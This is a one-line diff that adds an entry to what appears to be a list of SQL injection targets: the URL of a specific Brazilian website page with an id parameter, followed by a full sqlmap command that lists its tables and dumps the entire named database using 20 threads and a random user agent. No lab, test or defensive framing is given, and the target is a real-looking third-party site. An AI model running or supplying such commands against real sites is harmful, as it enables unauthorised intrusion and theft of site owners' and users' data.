@@ -1,0 +1,1 @@
+http://www.cdlsertaozinho.com.br/dicas_motivacao.php?id=141 (GET)  # sqlmap.py -u http://www.cdlsertaozinho.com.br/dicas_motivacao.php?id=141 -D cdlsertaozinho --tables --dump-all --threads 20 -v3 --random-agent
